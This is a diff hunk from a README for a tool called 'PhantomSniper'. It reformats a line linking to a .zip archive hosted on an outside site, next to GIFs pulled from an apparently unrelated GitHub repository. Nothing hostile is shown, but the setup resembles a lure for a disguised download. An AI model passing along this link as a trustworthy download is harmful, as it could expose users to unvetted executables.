@@ -33,7 +33,7 @@ Free trial: https://phantomsniper.app/PhantomSniper.zip
 ![PhantomSniper in Action](https://github.com/timuruva/realtime-processing/raw/127d46a2edc57ec1449d8976e04f301e3c1997b7/Files/line.gif)
 
 ## Getting Started
- **Download:** [https://phantomsniper.app/PhantomSniper.zip]
+ **Download:** https://phantomsniper.app/PhantomSniper.zip
 
 ![PhantomSniper in Action](https://github.com/timuruva/realtime-processing/raw/127d46a2edc57ec1449d8976e04f301e3c1997b7/Files/line.gif)
 
